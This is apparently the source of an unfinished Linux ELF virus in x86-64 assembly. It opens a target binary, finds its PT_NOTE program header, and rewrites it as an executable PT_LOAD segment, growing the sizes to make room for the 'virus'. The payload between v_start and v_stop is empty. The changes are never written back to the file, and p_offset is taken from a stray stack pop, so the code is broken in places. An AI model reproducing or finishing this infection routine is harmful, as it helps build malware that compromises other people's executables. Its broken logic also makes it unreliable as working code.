section .bss
buffer resb 10000            ; Reserve 10KB for the ELF file
statbuf resb 144             ; Reserve space for struct stat (size = 144 bytes)

section .text
global _start

v_start:
    
v_stop:


_start:
    ; -------- Parse command line arguments --------
    mov rdi, [rsp + 16]       ; argv[1] (path to ELF file)
    test rdi, rdi
    jz exit_usage             ; If no argument, exit

    ; -------- Open the file --------
    mov rax, 2                ; sys_open
    mov rsi, 0                ; O_RDONLY
    syscall
    cmp rax, 0
    js exit_error
    mov rdi, rax              ; Save file descriptor

    ; -------- Retrieve file metadata (fstat) --------
    lea rsi, [statbuf]        ; Pointer to struct stat buffer
    mov rax, 5                ; sys_fstat
    syscall
    cmp rax, 0
    js exit_error

    ; -------- Save stat.st_size to buffer --------
    mov r15, buffer           ; Base of our buffer
    mov r13, qword [statbuf + 0x30] ; Retrieve st_size (file size)
    mov qword [r15 + 48], r13 ; Save stat.st_size into [r15 + 48]

    ; -------- Read file into buffer --------
    lea rsi, [buffer]         ; Address of buffer
    mov rdx, 10000            ; Buffer size
    mov rax, 0                ; sys_read
    syscall
    cmp rax, 0
    js exit_error
    mov rbx, rax              ; Save number of bytes read

    ; -------- Close the file --------
    mov rax, 3                ; sys_close
    syscall

    ; -------- Parse Program Header Table --------
parse_phdr:
    xor rcx, rcx              ; Counter for entries
    xor rdx, rdx              ; Store entry size

    mov cx, word [r15 + 0x38] ; e_phnum: Number of program headers
    mov rbx, qword [r15 + 0x20] ; e_phoff: Offset of program header table
    mov dx, word [r15 + 0x36] ; e_phentsize: Size of each program header

    lea rbx, [r15 + rbx]      ; Address of first program header

loop_phdr:
    cmp rcx, 0                ; Check if we’re done
    jle phdr_not_found

    mov eax, dword [rbx + 0x00] ; e_phdr.type
    cmp eax, 0x4              ; Check for PT_NOTE
    je pt_note_found

    add rbx, rdx              ; Move to the next program header
    dec rcx
    jmp loop_phdr

pt_note_found:
    ; -------- Modify PT_NOTE to PT_LOAD --------
    ; Change p_type to PT_LOAD
    mov dword [rbx + 0x00], 0x1   ; p_type = PT_LOAD (1)

    ; Change p_flags to PF_X | PF_R (0x5)
    mov dword [rbx + 0x04], 0x5   ; p_flags = PF_X | PF_R

    ; Set p_offset
    pop rax
    mov qword [rbx + 0x08], rax   ; p_offset = target EOF offset

    ; Calculate new virtual address
    mov r13, [r15 + 48]           ; Load stat.st_size
    add r13, 0xc000000            ; Add high address offset
    mov qword [rbx + 0x10], r13   ; p_vaddr = new virtual address
    mov qword [rbx + 0x18], r13   ; p_paddr = new virtual address

    ; Adjust file size
    mov rax, v_stop - v_start + 5
    add qword [rbx + 0x20], rax   ; Add virus size to p_filesz
    add qword [rbx + 0x28], rax   ; Add virus size to p_memsz

    ; Set alignment
    mov qword [rbx + 0x30], 0x200000 ; p_align = 2MB

    ; -------- Exit Normally --------
    mov rax, 60               ; sys_exit
    xor rdi, rdi
    syscall

phdr_not_found:
    mov rax, 60               ; sys_exit
    mov rdi, 2
    syscall

exit_usage:
    mov rax, 60               ; sys_exit
    mov rdi, 1
    syscall

exit_error:
    mov rax, 60               ; sys_exit
    mov rdi, 3
    syscall
